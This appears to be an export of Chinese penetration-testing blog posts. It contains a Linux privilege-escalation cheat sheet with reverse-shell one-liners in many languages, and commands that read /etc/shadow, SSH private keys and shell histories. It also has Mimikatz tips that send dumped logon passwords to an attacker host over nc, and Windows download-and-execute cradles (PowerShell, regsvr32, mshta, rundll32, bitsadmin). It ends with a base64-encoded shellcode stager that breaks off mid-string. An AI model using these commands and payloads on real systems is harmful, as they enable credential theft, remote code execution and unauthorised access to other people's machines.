      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型之md5_tips(ctf经常用到PHP弱类型)]]></title>
    <url>%2Farchives%2Fc26c2571.html</url>
    <content type="text"><![CDATA[&lt;?php if (md5(&apos;240610708&apos;) == &quot;0&quot;) { echo &quot;Matches&quot;; } ?&gt; 这里md5(&apos;240610708&apos;) == &quot;0&quot; == 0e987654321 同样也相等.]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[随手笔记_待整理]]></title>
    <url>%2Farchives%2Fe9bb571b.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>随手笔记_待整理</category>
      </categories>
      <tags>
        <tag>随手笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 提权常用命令集]]></title>
    <url>%2Farchives%2F27fa4050.html</url>
    <content type="text"><![CDATA[0x00 操作系统相关操作系统类型版本 cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian cat /etc/redhat-release # Redhat内核版本，是否是64位 cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz-环境变量 cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set查看是否有打印机 lpstat -a0x01 应用与服务相关查看正在运行的程序及对应的用户权限 ps aux ps -ef top cat /etc/services以root权限运行的进程 ps aux | grep root ps -ef | grep root查看安装了的应用 ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archives ls -alh /var/cache/yum/一些服务的配置文件 cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;计划任务 crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root找存储的明文用户名，密码 grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla0x02 通信与网络相关查看当前网络地址 /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network查看网络配置,DNS,DHCP,网关 cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname查看网络通信 lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w查看缓存 arp -e route /sbin/route -nee tcpdump tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21 tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]交互式shellbash版本： bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1perl版本: perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;python版本: python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;php版本： php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;ruby版本： ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;nc版本： nc -e /bin/sh 223.8.200.234 1234nc不使用-e： mknod /tmp/backpipe p /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipemknod: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipejava版本： r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()lua版本： lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;202.103.243.122&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;端口转发 lcx lcx -listen 4567 33891 #Attacker lcx -slave 111.222.333.444 4567 127.0.0.1 3389 # On the targets ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipe mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)隧道 ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig0x03 用户相关用户信息 id who w last cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos; # 列出超级用户 awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd #列出超级用户 cat /etc/sudoers sudo -l列家目录 ls -ahlR /root/ ls -ahlR /home/从配置文件里面寻找密码 cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg看其他用户的操作记录 cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_historyssh私钥 cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 文件系统相关/etc/目录下面文件 ls -aRl /etc/ | awk &apos;$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &apos;$1 ~ /^..w/&apos; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &apos;$1 ~ /^.....w/&apos; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &apos;$1 ~ /w.$/&apos; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone日志文件 ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases查看网站文件 ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/常见日志文件 cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/文件挂载 mount df -h cat /etc/fstabFind命令 find / -perm -1000 -type d 2&gt;/dev/null # 只有目录所有者才可以更改删除 find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息 寻找可写目录 find / -writable -type d 2&gt;/dev/null # 可写目录 find / -perm -222 -type d 2&gt;/dev/null # 可写目录 find / -perm -o w -type d 2&gt;/dev/null # 可写目录 find / -perm -o x -type d 2&gt;/dev/null # 可执行目录 find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null # 可写可执行目录查找文件 find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print 2&gt;/dev/null # 可写文件 find / dir -xdev \( -nouser -o -nogroup \) -print 2&gt;/dev/null # 无所有者文件0x05 准备及攻击查看语言支持 find / -name perl* find / -name python* find / -name gcc* find / -name cc查看上传方式 find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp寻找exp http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com编译exp which gcc gcc exp.c -o exp运行 chmod +x exp ./exp0x06 提权辅助脚本 LinEnum linuxprivchecker.py]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Mimikatz 使用Tips]]></title>
    <url>%2Farchives%2Fe83f08e9.html</url>
    <content type="text"><![CDATA[Mimikatz 使用Tips1.记录 Mimikatz输出：C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;log sekurlsa::logonpasswords full&quot;&quot; exit &amp;&amp; dir2.将输出导入到本地文件：C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; log.txt3.将输出传输到远程机器：Attacker执行: E:\&gt;nc -lvp 4444Victim执行: C:\&gt;mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit | nc.exe -vv 192.168.52.1 4444192.168.52.1 为Attacker IP 4.通过nc远程执行Mimikatz：Victim执行: C:\&gt;nc -lvp 443Attacker执行: E:\&gt;nc.exe -vv 192.168.52.128 443 -e mimikatz.exe192.168.52.128 为Victim IP 5.hash传递Privilege::debug sekurlsa::pth /domain:xxxx /user:xxxxx /ntlm:xxxxxx之后会弹出cmd。 6.获得PPTP口令mimikatz.exe privilege::debug token::elevate lsadump::secrets exit]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识科普</category>
        <category>奇淫技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows命令执行漏洞技巧]]></title>
    <url>%2Farchives%2Fd7cf94f6.html</url>
    <content type="text"><![CDATA[经常有小伙伴碰到了命令执行漏洞不会玩，比如mssql注入点的命令执行，怎么来获取一个meterpreter？这个时候，就需要想办法来获取了，关于命令行来执行远程命令的方法碰到很多，但是用的时候老会记不起来，所以在这里把碰到的作为一个总结，没准那种方法能帮到你。（当然，我们这里不说可以直接echo webshell的情形） 1、powershelleg: powershell IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&apos;); Invoke-Mimikatz2、regsvr32regsvr32 /u /s /i:http://site.com/js.png scrobj.dlljs.png&lt;?XML version=&quot;1.0&quot;?&gt; &lt;scriptlet&gt; &lt;registration progid=&quot;ShortJSRAT&quot; classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language=&quot;JScript&quot;&gt; &lt;![CDATA[ ps = &quot;cmd.exe /c calc.exe&quot;; new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true); ]]&gt; &lt;/script&gt; &lt;/registration&gt; &lt;/scriptlet&gt;rundll32eg: rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%细节:https://github.com/3gstudent/Javascript-Backdoor mshta1） mshta http://site.com/calc.hta 2） mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))calc.hta&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;calc.exe&quot; self.close &lt;/script&gt; &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt; &lt;/HTML&gt;pubprn.vbscscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct6、bitsadmineg: cmd.exe /c bitsadmin /transfer d90f http://site.com/a %APPDATA%\d90f.exe&amp;%APPDATA%\d90f.exe&amp;del %APPDATA%\d90f.exe7、python（需安装）eg: python -c &quot;import urllib2; exec urllib2.urlopen(&apos;http://site.com/abc&apos;).read();&quot; abc import base64; exec base64.b64decode(&quot;aW1wb3J0IGN0eXBlcwppbXBvcnQgcGxhdGZvcm0KCihhcmNoLCB0eXBlKSA9IHBsYXRmb3JtLmFyY2hpdGVjdHVyZSgpCgojIDMyLWJpdCBQeXRob24KaWYgYXJjaCA9PSAiMzJiaXQiOgoJc2hlbGxjb2RlID0gIlx4ZmNceGU4XHg4OVx4MDBceDAwXHgwMFx4NjBceDg5XHhlNVx4MzFceGQyXHg2NFx4OGJceDUyXHgzMFx4OGJceDUyXHgwY1x4OGJceDUyXHgxNFx4OGJceDcyXHgyOFx4MGZceGI3XHg0YVx4MjZceDMxXHhmZlx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4YzFceGNmXHgwZFx4MDFceGM3XHhlMlx4ZjBceDUyXHg1N1x4OGJceDUyXHgxMFx4OGJceDQyXHgzY1x4MDFceGQwXHg4Ylx4NDBceDc4XHg4NVx4YzBceDc0XHg0YVx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4OGJceDU4XHgyMFx4MDFceGQzXHhlM1x4M2NceDQ5XHg4Ylx4MzRceDhiXHgwMVx4ZDZceDMxXHhmZlx4MzFceGMwXHhhY1x4YzFceGNmXHgwZFx4MDFceGM3XHgzOFx4ZTBceDc1XHhmNFx4MDNceDdkXHhmOFx4M2JceDdkXHgyNFx4NzVceGUyXHg1OFx4OGJceDU4XHgyNFx4MDFceGQzXHg2Nlx4OGJceDBjXHg0Ylx4OGJceDU4XHgxY1x4MDFceGQzXHg4Ylx4MDRceDhiXHgwMVx4ZDBceDg5XHg0NFx4MjRceDI0XHg1Ylx4NWJceDYxXHg1OVx4NWFceDUxXHhmZlx4ZTBceDU4XHg1Zlx4NWFceDhiXHgxMlx4ZWJceDg2XHg1ZFx4NjhceDZlXHg2NVx4NzRceDAwXHg2OFx4NzdceDY5XHg2ZVx4NjlceDU0XHg2OFx4NGNceDc3XHgyNlx4MDdceGZmXHhkNVx4ZThceDgwXHgwMFx4MDBceDAwXHg0ZFx4NmZceDdhXHg2OVx4NmNceDZjXHg2MVx4MmZceDM1XHgyZVx4MzBceDIwXHgyOFx4NjNceDZmXHg2ZFx4NzBceDYxXHg3NFx4NjlceDYyXHg2Y1x4NjVceDNiXHgyMFx4NGRceDUzXHg0OVx4NDVceDIwXHgzOVx4MmVceDMwXHgzYlx4MjBceDU3XHg2OVx4NmVceDY0XHg2Zlx4NzdceDczXHgyMFx4NGVceDU0XHgyMFx4MzZceDJlXHgzMVx4M2JceDIwXHg1N1x4NGZceDU3XHgzNlx4MzRceDNiXHgyMFx4NTRceDcyXHg2OVx4NjRceDY1XHg2ZVx4NzRceDJmXHgzNVx4MmVceDMwXHgzYlx4MjBceDQyXHg0Zlx4NDlceDQ1XHgzOVx4M2JceDQ1XHg0ZVx4NTVceDUzXHg0ZFx4NTNceDQ1XHgyOVx4MDBceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4NThceDU4XHg1OFx4MDBceDU5XHgzMVx4ZmZceDU3XHg1N1x4NTdceDU3XHg1MVx4NjhceDNhXHg1Nlx4NzlceGE3XHhmZlx4ZDVceGViXHg3OVx4NWJceDMxXHhjOVx4NTFceDUxXHg2YVx4MDNceDUxXHg1MVx4NjhceGI4XHgyMlx4MDBceDAwXHg1M1x4NTBceDY4XHg1N1x4ODlceDlmXHhjNlx4ZmZceGQ1XHhlYlx4NjJceDU5XHgzMVx4ZDJceDUyXHg2OFx4MDBceDAyXHg2MFx4ODRceDUyXHg1Mlx4NTJceDUxXHg1Mlx4NTBceDY4XHhlYlx4NTVceDJlXHgzYlx4ZmZceGQ1XHg4OVx4YzZceDMxXHhmZlx4NTdceDU3XHg1N1x4NTdceDU2XHg2OFx4MmRceDA2XHgxOFx4N2JceGZmXHhkNVx4ODVceGMwXHg3NFx4NDRceDMxXHhmZlx4ODVceGY2XHg3NFx4MDRceDg5XHhmOVx4ZWJceDA5XHg2OFx4YWFceGM1XHhlMlx4NWRceGZmXHhkNVx4ODlceGMxXHg2OFx4NDVceDIxXHg1ZVx4MzFceGZmXHhkNVx4MzFceGZmXHg1N1x4NmFceDA3XHg1MVx4NTZceDUwXHg2OFx4YjdceDU3XHhlMFx4MGJceGZmXHhkNVx4YmZceDAwXHgyZlx4MDBceDAwXHgzOVx4YzdceDc0XHhiY1x4MzFceGZmXHhlYlx4MTVceGViXHg0OVx4ZThceDk5XHhmZlx4ZmZceGZmXHgyZlx4NTJceDYyXHg0Nlx4NjJceDAwXHgwMFx4NjhceGYwXHhiNVx4YTJceDU2XHhmZlx4ZDVceDZhXHg0MFx4NjhceDAwXHgxMFx4MDBceDAwXHg2OFx4MDBceDAwXHg0MFx4MDBceDU3XHg2OFx4NThceGE0XHg1M1x4ZTVceGZmXHhkNVx4OTNceDUzXHg1M1x4ODlceGU3XHg1N1x4NjhceDAwXHgyMFx4MDBceDAwXHg1M1x4NTZceDY4XHgxMlx4OTZceDg5XHhlMlx4ZmZceGQ1XHg4NVx4YzBceDc0XHhjZFx4OGJceDA3XHgwMVx4YzNceDg1XHhjMFx4NzVceGU1XHg1OFx4YzNceGU4XHgzN1x4ZmZceGZmXHhmZlx4MzFceDMwXHgzM1x4MmVceDMyXHgzM1x4MzhceDJlXHgzMlx4MzJceDM1XHgyZVx4MzFceDMyXHgzOVx4MDAiCgojIDY0LWJpdCBQeXRob24KZWxpZiBhcmNoID09ICI2NGJpdCI6CglzaGVsbGNvZGUgPSAiXHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjOFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDY2XHg4MVx4NzhceDE4XHgwYlx4MDJceDc1XHg3Mlx4OGJceDgwXHg4OFx4MDBceDAwXHgwMFx4NDhceDg1XHhjMFx4NzRceDY3XHg0OFx4MDFceGQwXHg1MFx4OGJceDQ4XHgxOFx4NDRceDhiXHg0MFx4MjBceDQ5XHgwMVx4ZDBceGUzXHg1Nlx4NDhceGZmXHhjOVx4NDFceDhiXHgzNFx4ODhceDQ4XHgwMVx4ZDZceDRkXHgzMVx4YzlceDQ4XHgzMVx4YzBceGFjXHg0MVx4YzFceGM5XHgwZFx4NDFceDAxXHhjMVx4MzhceGUwXHg3NVx4ZjFceDRjXHgwM1x4NGNceDI0XHgwOFx4NDVceDM5XHhkMVx4NzVceGQ4XHg1OFx4NDRceDhiXHg0MFx4MjRceDQ5XHgwMVx4ZDBceDY2XHg0MVx4OGJceDBjXHg0OFx4NDRceDhiXHg0MFx4MWNceDQ5XHgwMVx4ZDBceDQxXHg4Ylx4MDRceDg4XHg0OFx4MDFceGQwXHg0MVx4NThceDQxXHg1OFx4NWVceDU5XHg1YVx4NDFceDU4XHg0MVx4NTlceD